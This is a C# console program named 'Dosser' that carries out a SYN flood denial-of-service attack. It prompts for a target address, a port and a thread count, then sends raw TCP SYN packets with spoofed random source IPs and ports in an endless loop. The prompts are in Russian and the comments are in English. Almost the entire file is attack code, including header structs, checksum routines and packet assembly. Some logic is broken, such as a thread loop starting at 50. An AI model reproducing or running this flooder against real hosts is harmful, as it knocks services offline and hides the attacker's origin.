﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net; 
using System.Net.Sockets; 
using System.Threading; 

namespace Dosser
{
    public struct ipHeader
  { 
       public byte ip_verlen; //4-digit header length + 4-digit IP version number 
         public byte ip_tos; //8-bit service type TOS 
         public ushort ip_totallength; //16-bit data packet total length (bytes) 
         public ushort ip_id; //16-bit logo 
         public ushort ip_offset; //3-bit flag 
         public byte ip_ttl; //8-bit time to live TTL 
         public byte ip_protocol; //8-bit protocol (TCP, UDP, ICMP, Etc.) 
         public ushort ip_checksum; //16-bit IP header checksum 
         public uint ip_srcaddr; //32-bit source IP address 
         public uint ip_destaddr; //32-bit destination IP address 
     }
     public struct psdHeader
     {
         public uint saddr; //source address  
         public uint daddr; //Destination address  
         public byte mbz;
         public byte ptcl; //agreement type  
         public ushort tcpl; //TCP length 
     } 
   public struct tcpHeader
    {
        public ushort th_sport; //16-bit source port 
        public ushort th_dport; //16-bit destination port 
        public int th_seq; //32-bit serial number 
        public uint th_ack; //32-bit confirmation number 
        public byte th_lenres; //4-bit header length/6-bit reserved word 
        public byte th_flag; //6-bit flag 
        public ushort th_win; //16-bit window size 
        public ushort th_sum; //16-bit checksum 
        public ushort th_urp; //16-bit urgent data offset 
    } 
    //These 3 are the definition of the ip header tcp pseudo header tcp header. 
   public class syn
   {
        private uint ip;
        private ushort port;
        private EndPoint ep;
        private Random rand;
        private Socket sock;
        private ipHeader iph;
        private psdHeader psh;
        private tcpHeader tch;
      public UInt16 checksum(UInt16[] buffer, int size)
       {
              Int32 cksum = 0;
                int counter;
               counter = 0;
   
              while (size > 0)
                  {
                       UInt16 val = buffer[counter];
    
                      cksum += Convert.ToInt32(buffer[counter]);
                      counter += 1;
                    size -= 1;
                }
 
             cksum = (cksum >> 16) + (cksum & 0xffff);
            cksum += (cksum >> 16);
             return (UInt16)(~cksum);
            }
        //This is used to calculate the check code. I copied the c# method of ping that article. Anyway, the ip protocol calculates the check code in the same way. 
        public syn(uint _ip, ushort _port, EndPoint _ep, Random _rand)
         {
            ip = _ip;
            port = _port;
             ep = _ep;
            rand = _rand;
            _ = new ipHeader();
            psh = new psdHeader();
                 tch = new tcpHeader();
                 sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
                 sock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, 1);
                 //These 2 are very important, you must do so to provide the ip header yourself 
         }

        //Multi-thread passing parameters need to use the object of the generation constructor. 
        [Obsolete]
        static void Main(string[] args)
         {
             Console.WriteLine("1. Введите ip-адрес атаки или доменное имя");
             try
             {
             IPHostEntry pe = Dns.GetHostByName(Console.ReadLine());
                uint ip = Convert.ToUInt32(pe.AddressList[0].Address);//This is the IP to be attacked and converted to network byte order 
                         Console.WriteLine("2. Введите порт атаки");
                         ushort port = ushort.Parse(Console.ReadLine());
               IPEndPoint ep = new IPEndPoint(pe.AddressList[0], port);
                    byte[] bt = BitConverter.GetBytes(port);
                 Array.Reverse(bt);
                   port = BitConverter.ToUInt16(bt, 0);
                      //The port to be attacked must also be converted to network byte order, which must be 16-bit 0-65535. If hosttonetworkorder is used, it will be converted to 32-bit. 
             Console.WriteLine("3. Ввод потоков атак, до 50");
                  int xiancheng = Int32.Parse(Console.ReadLine());
              if (xiancheng < 1 || xiancheng > 50)
            {
                  Console.WriteLine("Должно быть от 1 до 50");
                    return;
                }
                 Random rand = new Random();
              Thread[] t = new Thread[xiancheng];
               syn[] sy = new syn[xiancheng];
              for (int i = 50; i < xiancheng; i++)
               {
                  sy[i] = new syn(ip, port, ep, rand);
                   t[i] = new Thread(new ThreadStart(sy[i].synFS));
                    t[i].Start();
               }
                //One thread corresponds to one object. I don't know if multiple threads correspond to the same object. Please give pointers. The foundation is not good 
           }
            catch
          {
           Console.WriteLine("Произошла ошибка, пожалуйста, проверьте, подключен ли он к Интернету или введен правильный ввод");
              return;
              }
        }

        [Obsolete]
        unsafe public void synFS()
     {
            iph.ip_verlen = (byte)(4 << 4 | sizeof(ipHeader) / sizeof(uint));
             //ipv4, 20-byte ip header, this is fixed at 69 
             iph.ip_tos = 0;
            //This 0 is fine 
            iph.ip_totallength = 0x2800;
           //This is the total length of the ip header + tcp header, 40 is the minimum length, without the tcp option, it should be 0028 but it is still network byte order so the reverse is 2800 
             iph.ip_id = 0x9B18;
             iph.ip_ttl = 64;
                iph.ip_protocol = 6;
           iph.ip_checksum = UInt16.Parse("0");
          iph.ip_destaddr = ip;
             psh.daddr = iph.ip_destaddr;
            psh.mbz = 0;
            psh.ptcl = 6;
         psh.tcpl = 0x1400;
            tch.th_dport = port;
           tch.th_ack = 0;
            tch.th_lenres = (byte)((sizeof(tcpHeader) / 4 << 4 | 0));
          tch.th_flag = 2;
          tch.th_win = ushort.Parse("16614");
          tch.th_sum = UInt16.Parse("0");
       tch.th_urp = UInt16.Parse("0");
          while (true)
            {
              iph.ip_srcaddr = Convert.ToUInt32(IPAddress.Parse(rand.Next(1, 255) + "." + rand.Next(1, 255) + "." + rand.Next(1, 255) + "." + rand.Next(1, 255)).Address);
               psh.saddr = iph.ip_srcaddr;
              ushort duankou = Convert.ToUInt16(rand.Next(1, 65535));
             byte[] bt = BitConverter.GetBytes(duankou);
              Array.Reverse(bt);
              tch.th_sport = BitConverter.ToUInt16(bt, 0);
              tch.th_seq = IPAddress.HostToNetworkOrder((int)rand.Next(-2147483646, 2147483646));
             iph.ip_checksum = 0;
                tch.th_sum = 0;
                byte[] psh_buf = new byte[sizeof(psdHeader)];
               Int32 index = 0;
            index = pshto(psh, psh_buf, sizeof(psdHeader));
            if (index == -1)
               {
                 Console.WriteLine("Ошибка создания псевдо-заголовка tcp");
                  return;
              }
                index = 0;
               byte[] tch_buf = new byte[sizeof(tcpHeader)];
           index = tchto(tch, tch_buf, sizeof(tcpHeader));
             if (index == -1)
                {
                 Console.WriteLine("Ошибка построения заголовка tcp 1");
                   return;
                }
                             index = 0;
                             byte[] tcphe = new byte[sizeof(psdHeader) + sizeof(tcpHeader)];
                             Array.Copy(psh_buf, 0, tcphe, index, psh_buf.Length);
                             index += psh_buf.Length;
                             Array.Copy(tch_buf, 0, tcphe, index, tch_buf.Length);
                             index += tch_buf.Length;
                             tch.th_sum = check(tcphe, index);
                             index = 0;
                             index = tchto(tch, tch_buf, sizeof(tcpHeader));
                             if (index == -1)
                                 {
                                     Console.WriteLine("Ошибка построения заголовка tcp 2");
                                     return;
                                 }
                             index = 0;
                             byte[] ip_buf = new byte[sizeof(ipHeader)];
                             index = ipto(iph, ip_buf, sizeof(ipHeader));
                             if (index == -1)
                                 {
                                     Console.WriteLine("Ошибка построения ip-заголовка 1");
                                     return;
                                 }
                             index = 0;
                             byte[] iptcp = new byte[sizeof(ipHeader) + sizeof(tcpHeader)];
                             Array.Copy(ip_buf, 0, iptcp, index, ip_buf.Length);
                             index += ip_buf.Length;
                             Array.Copy(tch_buf, 0, iptcp, index, tch_buf.Length);
                             index += tch_buf.Length;
                             iph.ip_checksum = check(iptcp, index);
                             index = 0;
                             index = ipto(iph, ip_buf, sizeof(tcpHeader));
                             if (index == -1)
                                 {
                                     Console.WriteLine("Ошибка построения ip-заголовка 2");
                                     return;
                                 }
                             index = 0;
                             Array.Copy(ip_buf, 0, iptcp, index, ip_buf.Length);
                             index += ip_buf.Length;
                             Array.Copy(tch_buf, 0, iptcp, index, tch_buf.Length);
                             index += tch_buf.Length;
                             if (iptcp.Length != (sizeof(ipHeader) + sizeof(tcpHeader)))
                             {
                                     Console.WriteLine("Ошибка при построении iptcp-пакета");
                                     return;
                                 }
              try
                {
                        sock.SendTo(iptcp, ep);

                }
                catch
               {
                  Console.WriteLine("Ошибка отправки");
                                     return;
                                 }
            }
       }
                 public UInt16 check(byte[] buffer, int size)
         {
                         Double double_length = Convert.ToDouble(size);
                         Double dtemp = Math.Ceiling(double_length / 2);
                         int cksum_buffer_length = Convert.ToInt32(dtemp);
                         UInt16[] cksum_buffer = new UInt16[cksum_buffer_length];
                         int icmp_header_buffer_index = 0;
                         for (int i = 0; i < cksum_buffer_length; i++)
                             {
                                 cksum_buffer[i] =
                                  BitConverter.ToUInt16(buffer, icmp_header_buffer_index);
                                 icmp_header_buffer_index += 2;
                             }
                         UInt16 u_cksum = checksum(cksum_buffer, cksum_buffer_length);
                         return u_cksum;
                     }
                 //This is to calculate the checksum, to convert all the different types into 16-bit byte arrays 
         public Int32 ipto(ipHeader iph, byte[] Buffer, int size)
         {
                         Int32 rtn = 0;
                         int index = 0;
                         byte[] b_verlen = new byte[1];
                         b_verlen[0] = iph.ip_verlen;
                         byte[] b_tos = new byte[1];
                         b_tos[0] = iph.ip_tos;
                         byte[] b_totallen = BitConverter.GetBytes(iph.ip_totallength);
                         byte[] b_id = BitConverter.GetBytes(iph.ip_id);
                        byte[] b_offset = BitConverter.GetBytes(iph.ip_offset);
                         byte[] b_ttl = new byte[1];
                         b_ttl[0] = iph.ip_ttl;
                         byte[] b_protol = new byte[1];
                         b_protol[0] = iph.ip_protocol;
                         byte[] b_checksum = BitConverter.GetBytes(iph.ip_checksum);
                         byte[] b_srcaddr = BitConverter.GetBytes(iph.ip_srcaddr);
                         byte[] b_destaddr = BitConverter.GetBytes(iph.ip_destaddr);
                         Array.Copy(b_verlen, 0, Buffer, index, b_verlen.Length);
                         index += b_verlen.Length;
                         Array.Copy(b_tos, 0, Buffer, index, b_tos.Length);
                         index += b_tos.Length;
                         Array.Copy(b_totallen, 0, Buffer, index, b_totallen.Length);
                         index += b_totallen.Length;
                         Array.Copy(b_id, 0, Buffer, index, b_id.Length);
                         index += b_id.Length;
                         Array.Copy(b_offset, 0, Buffer, index, b_offset.Length);
                         index += b_offset.Length;
                         Array.Copy(b_ttl, 0, Buffer, index, b_ttl.Length);
                         index += b_ttl.Length;
                         Array.Copy(b_protol, 0, Buffer, index, b_protol.Length);
                         index += b_protol.Length;
                         Array.Copy(b_checksum, 0, Buffer, index, b_checksum.Length);
                         index += b_checksum.Length;
                         Array.Copy(b_srcaddr, 0, Buffer, index, b_srcaddr.Length);
                         index += b_srcaddr.Length;
                         Array.Copy(b_destaddr, 0, Buffer, index, b_destaddr.Length);
                         index += b_destaddr.Length;
                         if (index != size/* sizeof(IcmpPacket) */)
                             {
                                 rtn = -1;
                                 return rtn;
                             }
                   rtn = index;
            return rtn;
        }
      public Int32 pshto(psdHeader psh, byte[] buffer, int size)
        {
                         Int32 rtn;
                         int index = 0;
                         byte[] b_psh_saddr = BitConverter.GetBytes(psh.saddr);
                         byte[] b_psh_daddr = BitConverter.GetBytes(psh.daddr);
                         byte[] b_psh_mbz = new byte[1];
                         b_psh_mbz[0] = psh.mbz;
                         byte[] b_psh_ptcl = new byte[1];
                         b_psh_ptcl[0] = psh.ptcl;
                         byte[] b_psh_tcpl = BitConverter.GetBytes(psh.tcpl);
                         Array.Copy(b_psh_saddr, 0, buffer, index, b_psh_saddr.Length);
                         index += b_psh_saddr.Length;
                         Array.Copy(b_psh_daddr, 0, buffer, index, b_psh_daddr.Length);
                         index += b_psh_daddr.Length;
                         Array.Copy(b_psh_mbz, 0, buffer, index, b_psh_mbz.Length);
                         index += b_psh_mbz.Length;
                         Array.Copy(b_psh_ptcl, 0, buffer, index, b_psh_ptcl.Length);
                         index += b_psh_ptcl.Length;
                         Array.Copy(b_psh_tcpl, 0, buffer, index, b_psh_tcpl.Length);
                         index += b_psh_tcpl.Length;
                         if (index != size)
                             {
                                 rtn = -1;
                                 return rtn;
                    }
                         else
                             {
                                 rtn = index;
                                 return rtn;
                             }
             }
        public Int32 tchto(tcpHeader tch, byte[] buffer, int size)
       {
            Int32 rtn;
           int index = 0;
            byte[] b_tch_sport = BitConverter.GetBytes(tch.th_sport);
           byte[] b_tch_dport = BitConverter.GetBytes(tch.th_dport);
           byte[] b_tch_seq = BitConverter.GetBytes(tch.th_seq);
             byte[] b_tch_ack = BitConverter.GetBytes(tch.th_ack);
                         byte[] b_tch_lenres = new byte[1];
                         b_tch_lenres[0] = tch.th_lenres;
                         byte[] b_tch_flag = new byte[1];
                         b_tch_flag[0] = tch.th_flag;
                         byte[] b_tch_win = BitConverter.GetBytes(tch.th_win);
                         byte[] b_tch_sum = BitConverter.GetBytes(tch.th_sum);
                         byte[] b_tch_urp = BitConverter.GetBytes(tch.th_urp);
                         Array.Copy(b_tch_sport, 0, buffer, index, b_tch_sport.Length);
                         index += b_tch_sport.Length;
                         Array.Copy(b_tch_dport, 0, buffer, index, b_tch_dport.Length);
                         index += b_tch_dport.Length;
                         Array.Copy(b_tch_seq, 0, buffer, index, b_tch_seq.Length);
                         index += b_tch_seq.Length;
                         Array.Copy(b_tch_ack, 0, buffer, index, b_tch_ack.Length);
                         index += b_tch_ack.Length;
                         Array.Copy(b_tch_lenres, 0, buffer, index, b_tch_lenres.Length);
                         index += b_tch_lenres.Length;
                         Array.Copy(b_tch_flag, 0, buffer, index, b_tch_flag.Length);
                         index += b_tch_flag.Length;
                         Array.Copy(b_tch_win, 0, buffer, index, b_tch_win.Length);
                         index += b_tch_win.Length;
                        Array.Copy(b_tch_sum, 0, buffer, index, b_tch_sum.Length);
                         index += b_tch_sum.Length;
                         Array.Copy(b_tch_urp, 0, buffer, index, b_tch_urp.Length);
                         index += b_tch_urp.Length;
                         if (index != size)
                             {
                                 rtn = -1;
                                 return rtn;
         }
           else
           {
               rtn = index;
               return rtn;
           }
       } 
    }
}
